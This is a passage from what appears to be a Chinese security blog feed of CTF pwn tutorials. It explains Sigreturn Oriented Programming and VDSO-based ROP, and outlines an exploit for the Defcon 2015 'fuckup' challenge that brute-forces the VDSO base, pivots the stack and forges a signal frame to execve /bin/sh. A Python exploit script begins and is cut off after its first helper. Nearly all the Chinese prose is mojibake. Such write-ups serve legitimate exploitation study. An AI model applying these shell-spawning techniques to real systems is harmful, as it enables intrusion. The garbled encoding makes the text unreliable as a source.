é¢˜ç›®æ˜¯ä¸€æ ·çš„ã€‚</p><p>ä¸æˆ‘å‰é¢çš„æ–‡ç« ï¼ŒPlaidCTF 2013: ropasaurusrexçš„åˆ©ç”¨æ–¹å¼åŸºæœ¬ç›¸åŒï¼Œç”±äºç¯‡å¹…åŸå› å°±ä¸ç»§ç»­å†™ä¸‹å»äº†ã€‚</p><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul><li>HCTF æºç  <a href="https://github.com/zh-explorer/hctf2016-brop/blob/master/main.c">https://github.com/zh-explorer/hctf2016-brop/blob/master/main.c</a></li><li>muheåšå®¢ <a href="http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/">http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/</a></li><li>ä»¥åŠé˜Ÿå†… å¸ˆå‚…çš„Writeup</li></ul></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸºç¡€æ ˆæº¢å‡ºå¤ä¹  ä¸‰ ä¹‹ SROP</title>
      <link href="stack-overflow-three-SROP.html"/>
      <url>stack-overflow-three-SROP.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>æ‰¿æ¥ä¸Šä¸€ç¯‡ï¼Œè¿™ç¯‡å­¦ä¹ SROP<br>æœ€è¿‘å‡ºç°SROPçš„é¢˜ç›®ï¼Œå°±æ˜¯XCTF -NJCTFä¸­çš„ <a href="http://bobao.360.cn/ctf/learning/188.html">Pwn300-233</a><br> å½“ç„¶ï¼Œè™½ç„¶å‡ºé¢˜äººæ˜¯è¿™ä¹ˆå‡ºçš„ï¼Œä½†æ˜¯ä¹Ÿè¿˜æ˜¯æœ‰éé¢„æœŸåšæ³•çš„ã€‚æ¯”å¦‚<em>Joker</em>å¸ˆå‚…çš„é’ˆå¯¹è¿™ä¸ªé¢˜ç›®çš„å¼ºè¡Œè§£å†³æ–¹æ¡ˆï¼Œå¼ºè¡ŒçŒœlibc base ç„¶åæš´åŠ›è·‘ï¼Œç”¨ROP è§£å†³ã€‚<br>é‚£ä¹ˆ SROPæ˜¯ä»€ä¹ˆï¼Œä¸æ™®é€šçš„ROPæœ‰ä»€ä¹ˆåŒºåˆ«å‘¢?æˆ‘ä»¬å¯ä»¥å¼€å§‹å­¦ä¹ äº†ã€‚</p><h1 id="ä»€ä¹ˆæ˜¯SROP"><a href="#ä»€ä¹ˆæ˜¯SROP" class="headerlink" title="ä»€ä¹ˆæ˜¯SROP"></a>ä»€ä¹ˆæ˜¯SROP</h1><p>SROP: Sigreturn Oriented Programming  ç³»ç»ŸSignal Dispatchä¹‹å‰ä¼šå°†æ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆï¼Œç„¶åè°ƒç”¨signal handlerï¼Œsignal handlerè¿”å›æ—¶ä¼šå°†æ ˆçš„å†…å®¹è¿˜åŸåˆ°å¯„å­˜å™¨ã€‚ å¦‚æœäº‹å…ˆå¡«å……æ ˆï¼Œç„¶åç›´æ¥è°ƒç”¨signal handlerï¼Œé‚£åœ¨è¿”å›çš„æ—¶å€™å°±å¯ä»¥æ§åˆ¶å¯„å­˜å™¨çš„å€¼ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¾—å…ˆäº†è§£ä¸€ä¸‹signalçš„è°ƒç”¨æµç¨‹ï¼Œé‚£ä¹ˆæˆ‘å°±èƒ½å¤§æ¦‚äº†è§£SROPçš„åˆ©ç”¨åŸç†ã€‚</p><p>æ­£å¦‚mctrainï¼Œåœ¨ä»–çš„<a href="http://www.freebuf.com/articles/network/87447.html">ã€ŠSigreturn Oriented Programming (SROP) Attackæ”»å‡»åŸç†ã€‹</a>æ–‡ç« é‡Œæ‰€æåˆ°çš„ï¼Œå½“å†…æ ¸å‘æŸä¸ªè¿›ç¨‹å‘èµ·ï¼ˆdeliverï¼‰ä¸€ä¸ªsignalï¼Œè¯¥è¿›ç¨‹ä¼šè¢«æš‚æ—¶æŒ‚èµ·ï¼ˆsuspendï¼‰ï¼Œè¿›å…¥å†…æ ¸ï¼ˆ1ï¼‰ï¼Œç„¶åå†…æ ¸ä¸ºè¯¥è¿›ç¨‹ä¿å­˜ç›¸åº”çš„ä¸Šä¸‹æ–‡ï¼Œè·³è½¬åˆ°ä¹‹å‰æ³¨å†Œå¥½çš„signal handlerä¸­å¤„ç†ç›¸åº”signalï¼ˆ2ï¼‰ï¼Œå½“signal handlerè¿”å›ä¹‹åï¼ˆ3ï¼‰ï¼Œå†…æ ¸ä¸ºè¯¥è¿›ç¨‹æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œï¼ˆ4ï¼‰ã€‚<br><a href="http://oayoilchh.bkt.clouddn.com/17-3-21/35564144-file_1490109597511_10b81.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-3-21/35564144-file_1490109597511_10b81.png"></a><br>åœ¨è¿™å››æ­¥è¿‡ç¨‹ä¸­ï¼Œç¬¬ä¸‰æ­¥æ˜¯å…³é”®ï¼Œå³å¦‚ä½•ä½¿å¾—ç”¨æˆ·æ€çš„signal handleræ‰§è¡Œå®Œæˆä¹‹åèƒ½å¤Ÿé¡ºåˆ©è¿”å›å†…æ ¸æ€ã€‚åœ¨ç±»UNIXçš„å„ç§ä¸åŒçš„ç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªè¿‡ç¨‹æœ‰äº›è®¸çš„åŒºåˆ«ï¼Œä½†æ˜¯å¤§è‡´è¿‡ç¨‹æ˜¯ä¸€æ ·çš„ã€‚</p><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬æ˜¯å¦‚ä½•åˆ©ç”¨è¿™ä¸ªç³»ç»Ÿè°ƒç”¨æ¥åšä¸€äº›ä¸å¯å‘Šäººçš„äº‹æƒ…çš„å‘¢ï¼Ÿ<br>åœ¨singnalä¸­å¯ä»¥è¯´æ˜¯ï¼Œæœ‰ä¸¤ä¸ªå±‚æ¬¡ï¼Œä¸€ä¸ªæ˜¯ç”¨æˆ·ï¼Œä¸€ä¸ªæ˜¯å†…æ ¸å±‚æ¬¡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†è¿™ä¸ªè¿‡ç¨‹ç®€å•çš„çœ‹ä½œã€‚</p><ul><li>User code</li><li>singnal handler</li><li>sigreturn<br>å¦‚æœåœ¨mctrainæ–‡ç« ä¸­çœ‹æ‡‚äº†ï¼Œsignalçš„è°ƒç”¨æµç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è®²è®²ï¼Œå¦‚ä½•å»åˆ©ç”¨æ”»å‡»ï¼Œå³æˆ‘ä»¬å¯ä»¥è®²è®²ä»–çš„æ”»å‡»æµç¨‹ã€‚<h2 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h2></li></ul><hr><p>æ³¨ï¼š ä»¥ä¸‹å›¾ç‰‡å†…å®¹å‡æ¥è‡ª<a href="https://www.slideshare.net/AngelBoy1/sigreturn-ori">https://www.slideshare.net/AngelBoy1/sigreturn-ori</a> çš„PDF</p><ol><li>å½“å†…æ ¸å‘èµ·signal<br> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-3-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-3-01.png"></a></li><li>è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ ˆè¿˜å¹¶æœªæ²¡pushæ•°æ®ï¼Œä»¥åŠipä»ç„¶åœ¨User codeä¸Šã€‚</li><li>å°†æ•°æ®pushåˆ°æ ˆä¸­æ—¶<br> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-02.png"></a></li><li>å°†sigreturn syscallçš„ä½ç½® push è¿›æ ˆ<br> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-03.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-03.png"></a></li><li>ç´§æ¥ç€ç¨‹åºæµç¨‹è·³è½¬è‡³signal handler<br> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-04.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-04.png"></a></li><li>ä»signal handler è¿”å›<br> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-05.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-05.png"></a></li><li>ç„¶åæµç¨‹åˆè·³è½¬è‡³ sigreturn code<br> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-06.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-06.png"></a></li><li>æ‰§è¡Œ singreturn syscall<br> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-07.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-07.png"></a></li><li>stack å³æ ˆä¸Šçš„å†…å®¹å…¨éƒ¨ pop å›register ï¼Œæµç¨‹åˆé‡æ–°å›åˆ° user code<br> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-08.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-08.png"></a></li><li>è‡³æ­¤ï¼Œæˆ‘ä»¬åŸºæœ¬å®Œæˆäº†æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥å¤§æ¦‚æ€»ç»“ä¸‹ï¼Œ<br>æˆ‘ä»¬éœ€è¦çš„æ”»å‡»æ¡ä»¶<br>ç¬¬ä¸€ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡stack overflowç­‰æ¼æ´æ§åˆ¶æ ˆä¸Šçš„å†…å®¹ï¼›<br>ç¬¬äºŒï¼Œéœ€è¦çŸ¥é“æ ˆçš„åœ°å€ï¼ˆæ¯”å¦‚éœ€è¦çŸ¥é“è‡ªå·±æ„é€ çš„å­—ç¬¦ä¸²<code>/bin/sh</code>çš„åœ°å€ï¼‰ï¼›<br>ç¬¬ä¸‰ï¼Œéœ€è¦çŸ¥é“<code>syscall</code>æŒ‡ä»¤åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼›<br>ç¬¬å››ï¼Œéœ€è¦çŸ¥é“<code>sigreturn</code>ç³»ç»Ÿè°ƒç”¨çš„å†…å­˜åœ°å€ã€‚<br>å½“ç„¶ï¼Œæ›´è¯¦ç»†çš„ï¼Œå¦‚<em>åˆ©ç”¨SROPæ„é€ ç³»ç»Ÿè°ƒç”¨ä¸²ï¼ˆSystem call chainsï¼‰</em>ä¾æ—§å¯ä»¥ä»mctrainï¼Œåœ¨ä»–çš„<a href="http://www.freebuf.com/articles/network/87447.html">ã€ŠSigreturn Oriented Programming (SROP) Attackæ”»å‡»åŸç†ã€‹</a>æ–‡ç« æ‰¾åˆ°ï¼Œæˆ‘ä»¬è¿™é‡Œçš„é‡ç‚¹å¹¶ä¸æ˜¯SROPï¼Œè€Œæ˜¯åšSROP CTFé¢˜ã€‚</li></ol><p>SROPæ„é€ ï¼ŒåŠæ”»å‡»æµç¨‹æ¦‚æ‹¬çš„æ¥è®²å°±æ˜¯ï¼š</p><ul><li>ä¼ªé€ sigcontext ç»“æ„ï¼Œpushè¿›stackä¸­</li><li>è®¾ç½®ret addressåœ¨sigreturn syscallçš„gadget</li><li>å°†signal framä¸­çš„rip(eip)è®¾ç½®åœ¨syscallï¼ˆint 0x80)</li><li>å½“sigreturnè¿”å›æ—¶ï¼Œå°±å¯ä»¥æ‰§è¡Œsyscall<br>éœ€è¦è¯´æ˜çš„æ˜¯sigretrun gadgetçš„å¯»æ‰¾æ˜¯æœ‰å‰äººæ€»ç»“çš„</li></ul><ul><li>x86<ul><li>vdso æ­£å¸¸çš„ syscall handlerä¹Ÿä¼šä½¿ç”¨çš„</li></ul></li><li>x64<ul><li>kernel &lt;3.3</li><li>vsyscall (0xffffffff600000) &lt;= ä½ç½®ä¸€ç›´å›ºå®š</li><li>kernel &gt;= 3.3<ul><li>libc &lt;= æ™®é€šçš„syscall handerä¹Ÿä¼šä½¿ç”¨<h1 id="VDSO"><a href="#VDSO" class="headerlink" title="VDSO"></a>VDSO</h1>äº†è§£äº†ä¸€ä¸‹SROPï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å¯ä»¥å†æ¥å­¦ä¹ ä¸€ä¸‹ä»€ä¹ˆæ˜¯VDSOï¼Œä»¥åŠå¦‚ä½•ç›´æ¥åˆ©ç”¨VDSOåšROP<h2 id="VDSO-1"><a href="#VDSO-1" class="headerlink" title="VDSO"></a>VDSO</h2>VDSO(Virtual Dynamically-linked Shared Object)æ˜¯ä¸ªå¾ˆæœ‰æ„æ€çš„ä¸œè¥¿, å®ƒå°†å†…æ ¸æ€çš„è°ƒç”¨æ˜ å°„åˆ°ç”¨æˆ·æ€çš„åœ°å€ç©ºé—´ä¸­, ä½¿å¾—è°ƒç”¨å¼€é”€æ›´å°, è·¯å¾„æ›´å¥½.</li></ul></li></ul></li></ul><p>å¼€é”€æ›´å°æ¯”è¾ƒå®¹æ˜“ç†è§£, é‚£ä¹ˆè·¯å¾„æ›´å¥½æŒ‡çš„æ˜¯ä»€ä¹ˆå‘¢? æ‹¿x86ä¸‹çš„ç³»ç»Ÿè°ƒç”¨ä¸¾ä¾‹, ä¼ ç»Ÿçš„int 0x80æœ‰ç‚¹æ…¢, Intelå’ŒAMDåˆ†åˆ«å®ç°äº†sysenter, sysexitå’Œsyscall, sysret, å³æ‰€è°“çš„å¿«é€Ÿç³»ç»Ÿè°ƒç”¨æŒ‡ä»¤, ä½¿ç”¨å®ƒä»¬æ›´å¿«, ä½†æ˜¯ä¹Ÿå¸¦æ¥äº†å…¼å®¹æ€§çš„é—®é¢˜. äºæ˜¯Linuxå®ç°äº†vsyscall, ç¨‹åºç»Ÿä¸€è°ƒç”¨vsyscall, å…·ä½“çš„é€‰æ‹©ç”±å†…æ ¸æ¥å†³å®š. è€Œvsyscallçš„å®ç°å°±åœ¨VDSOä¸­.</p><p>Linux(kernel 2.6 or upper)ç¯å¢ƒä¸‹æ‰§è¡Œldd /bin/sh, ä¼šå‘ç°æœ‰ä¸ªåå­—å«linux-vdso.so.1(è€ç‚¹çš„ç‰ˆæœ¬æ˜¯linux-gate.so.1)çš„åŠ¨æ€æ–‡ä»¶, è€Œç³»ç»Ÿä¸­å´æ‰¾ä¸åˆ°å®ƒ, å®ƒå°±æ˜¯VDSO. ä¾‹å¦‚:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wings@sw:~$ ldd /bin/sh</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffee4bd1000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5e19e56000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x0000557ef5001000)</span><br><span class="line">wings@sw:~$ </span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆè¦ç”¨VDSO æ¥åšROPï¼Ÿ<br>åœ¨X86ç³»ç»Ÿä¸­ï¼Œä¼ ç»Ÿçš„system call:int 0x80å¹¶ä¸æ˜¯ç”±å¾ˆå¥½çš„æ•ˆæœçš„ï¼Œå› æ­¤åœ¨intel æ–°å‹çš„cpuæä¾›äº†æ–°çš„syscallæŒ‡ä»¤ã€‚</p><ul><li>sysenter</li><li>sysexit<br>ï¼ˆLinux kernel ã€‹= 2.6åçš„ç‰ˆæœ¬æ”¯æŒæ–°å‹syscallæœºåˆ¶ï¼‰</li></ul><p>VDSIå¯ä»¥é™ä½åœ¨ä¼ ç»Ÿçš„ int 0x80çš„overhead ä»¥åŠæä¾›äº†sigreturn æ–¹ä¾¿åœ¨signal handlerç»“æŸåè¿”å›åˆ°user code<br>å¦‚ä½•åˆ©ç”¨ VDSO åšROP<br>æˆ‘ä»¬éœ€è¦çŸ¥é“ <strong>sysenter</strong>å…¶å‚æ•°ä¼ é€’æ–¹å¼å’Œint 0x80æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦äº‹å‰è‡ªå·±åšå¥½funcion prolog<br><code>push ebp;mov ebp,sp</code><br>ä»¥åŠéœ€è¦ä¸€ä¸ª â€œA good gadgaet for stack pivotâ€ï¼Œå› ä¸ºå¦‚æœæ²¡åšfunction prologå¯ä»¥åˆ©ç”¨ebpå»æ”¹å˜stackä½ç½®</p><h2 id="Retrun-to-vDSO"><a href="#Retrun-to-vDSO" class="headerlink" title="Retrun to vDSO"></a>Retrun to vDSO</h2><p>å¦‚ä½•æ‰¾åˆ°vdso åœ°å€?<br>åŸºæœ¬ä¸Šé‡Œåˆ©ç”¨æ–¹æ³•å°±æ˜¯ï¼š</p><ol><li>è¦ä¹ˆæš´åŠ›è§£å†³</li><li>åˆ©ç”¨ ä¿¡æ¯æ³„éœ² å³æˆ‘ä»¬æ‰€å—çš„information leak<ul><li>ä½¿ç”¨ld.so _libc_stack_endæ‰¾åˆ° stackå…¶å®ä½ç½®ï¼Œè®¡ç®—ELF  Auxiliary vector offset å¹¶ä»ä¸­å–å‡ºAT_SYSINFO_EHDR </li><li>ä½¿ç”¨ld.soä¸­çš„_rtld_global_roçš„æŸä¸ªoffsetä¹Ÿæœ‰vdsoçš„ä½ç½®ã€‚<br>æˆ‘ä»¬éœ€è¦å°¤å…¶æ³¨æ„çš„æ˜¯åœ¨å¼€äº†ASLRçš„æƒ…å†µä¸‹ï¼ŒVDSOçš„åˆ©ç”¨æ˜¯æœ‰ä¸€å®šä¼˜åŠ¿çš„<br>åœ¨x86ç¯å¢ƒä¸‹ï¼š<br>åªæœ‰ä¸€ä¸ªå­—èŠ‚æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“æš´åŠ›è§£å†³<br>åœ¨x64ç¯å¢ƒä¸‹<br>åœ¨å¼€å¯äº†pieçš„æƒ…å½¢ æœ‰ 11å­—èŠ‚æ˜¯éšæœºçš„ ä¾‹å¦‚ï¼šCVE-2014-9585<br>ä½†æ˜¯åœ¨linux kernel 3.182.2ç‰ˆæœ¬ä¹‹åï¼Œè¿™ä¸ªå·²ç»å¢åŠ åˆ°äº†18ä¸ªå­—èŠ‚çš„éšæœº<h1 id="é‡å¤´æˆæ¥äº†ï¼šDefcon-2015-Qualifier-fuckup"><a href="#é‡å¤´æˆæ¥äº†ï¼šDefcon-2015-Qualifier-fuckup" class="headerlink" title="é‡å¤´æˆæ¥äº†ï¼šDefcon 2015 Qualifier fuckup"></a>é‡å¤´æˆæ¥äº†ï¼šDefcon 2015 Qualifier fuckup</h1>é¢˜ç›®å¯ä»¥åœ¨è¿™é‡Œä¸‹è½½ï¼š <a href="https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/pwnable/fuckup">this</a></li></ul></li></ol><p>æˆ‘ä»¬ç…§æ—§æ¥åˆ†æç¨‹åºï¼š</p><h2 id="æ€»ä½“ä¸Šæ¥è¯´"><a href="#æ€»ä½“ä¸Šæ¥è¯´" class="headerlink" title="æ€»ä½“ä¸Šæ¥è¯´"></a>æ€»ä½“ä¸Šæ¥è¯´</h2><p>ç¨‹åºåº”è¯¥æ˜¯å¼€å¯äº†ASLR çš„ï¼Œæ¯æ¬¡<br>ç”¨æˆ·æ‰§è¡Œå‘½ä»¤æ—¶ï¼ŒFUCKUPä¼šæ ¹æ®ç±»ä¼¼äºWELL512çš„ç”Ÿæˆç®—æ³•ç”Ÿæˆçš„éšæœºæ•°ï¼Œæ”¹å˜äºŒè¿›åˆ¶æ˜ å°„çš„å­˜å‚¨å™¨çš„åŸºå€ã€‚<br>å½“æˆ‘ä»¬è¿è¡Œç¨‹åºæ—¶ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªèœå•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ./fuckup</span><br><span class="line">Welcome to Fully Unguessable Convoluted Kinetogenic Userspace Pseudoransomization, the new and improved ASLR.</span><br><span class="line">This app is to <span class="built_in">help</span> prove the benefits of F.U.C.K.U.P.</span><br><span class="line">Main Menu</span><br><span class="line">---------</span><br><span class="line">1. Display info</span><br><span class="line">2. Change random</span><br><span class="line">3. View state info</span><br><span class="line">4. Test stack smash</span><br><span class="line">-------</span><br><span class="line">0. Quit</span><br></pre></td></tr></table></figure><p>å½“è¿è¡Œå‡½æ•°ï¼Œä»¥åŠåç¼–è¯‘ç¨‹åºä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£ç¨‹åºåŠŸèƒ½ã€‚<br>å½“æˆ‘ä»¬é€‰æ‹©åŠŸèƒ½2çš„æ—¶å€™ï¼Œâ€œApp moved to new random locationâ€ï¼Œtextæ®µå’Œstackä¼šè¢«ä¿®æ”¹ï¼Œé‡æ–°æŒ‡å‘æ–°çš„å†…å­˜åœ°å€<br>å½“æˆ‘ä»¬é€‰æ‹©3çš„æ—¶å€™ï¼Œä¼šå‘Šè¯‰æˆ‘ä»¬æœ€åä¸€ä¸ªéšæœºæ•°(å…¶å½“å‰determienstextbase)å†æ¬¡éšæœºåŒ–textã€‚è¿™å¯ä»¥ç”¨äºPRNGçš„é¢„æµ‹<br>é€‰é¡¹4ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input buffer is 10 bytes <span class="keyword">in</span> size. Accepting 100 bytes of data.</span><br><span class="line">This will crash however the location of the stack and binary are unknown to stop code execution</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨åŠŸèƒ½3æ‰¾åˆ°ä¸€ä¸ªmmap åœ°å€æ˜ å°„å‡½æ•°ï¼š<br>change_random(sub_80481A6) </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    seedf = randf_state_(a1) * 4294967295.0;</span><br><span class="line">    seedl = (signed __int64)seedf;</span><br><span class="line">    expect = (void *)(seedl &amp; 0xFFFFF000);</span><br><span class="line">    actual = mmap(v3, 0x804CA6C, v2, a1, a2, 0);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (seedl &amp; 0xFFFFF000) != actual );</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯»å¸¸çš„æ€è·¯ï¼Œæˆ‘ä»¬åŸºæœ¬æ˜¯åšä¸äº†äº†<br>å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼Œåšäº†ä¸ä¸€æ ·çš„åœ°å€æ˜ å°„ï¼Œæ‰€ä»¥å…¶å®è¿™ä¸ªé¢˜ç›®è¿˜æ˜¯è¦å›å½’äºVDSOä»¥åŠSROPã€‚<br>æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li><p>32ä½ä¸‹vdso åªæœ‰1å­—èŠ‚æ˜¯éšæœºçš„ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥brute forceç„¶ååˆ©ç”¨å…¶gadget</p></li><li><p>å¯ä»¥ç›´æ¥åˆ©ç”¨overflow return addressï¼Œåªæœ‰100ä¸ªå­—èŠ‚</p><ul><li>å…ˆåˆ©ç”¨vdsoçš„gadgetåšå‡ºread sys call å¹¶åŠ å¤§inputçš„å¤§å°</li><li>read è¯»å…¥çš„å†…å®¹æ”¾åˆ°tls</li><li>tlsä½ç½®åœ¨vdsoå‰ä¸€ä¸ªpage</li><li>ä½¿ç”¨sysenter å°†stack æ¢åˆ°tlsæ®µ<br>ç„¶åï¼Œæˆ‘ä»¬åœ¨ç¬¬äºŒæ¬¡è¾“å…¥çš„æ—¶å€™ å¯ä»¥å°† /bin/sh æ”¾å…¥åˆ°tlsæ®µï¼Œè¿™é‡Œè¦æ³¨æ„ä½†æ˜¯ï¼Œè¿™ä¸ªæ—¶å€™tlså·²ç»åœ¨æ ˆäº†</li></ul></li><li><p>ç´§æ¥ç€ï¼Œæˆ‘ä»¬sigreturn gadget ä»¥åŠ fack signal frameä¸€å¹¶æ”¾è¿›ï¼Œç„¶åå¯ä»¥ç›´æ¥execveæ‰§è¡Œ /bin/sh</p></li><li><p>è¿›è¡Œå¾ªç¯ï¼ŒçŸ¥é“æˆåŠŸgetshell</p></li></ul><p>æœ€åçš„expï¼Œæˆ‘æ²¡èƒ½æå®šï¼Œè¿™é‡Œå¯ä»¥å‚è€ƒ hastebin.comçš„è„šæœ¬</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_until</span>(<span class="params">socket, x</span>):</span></span><br><span class="line">    data = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data += socket.recv(<span class="number">4096</span>)</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;no data after: %s&quot;</span> % data)</span><br><span class="line">    <span 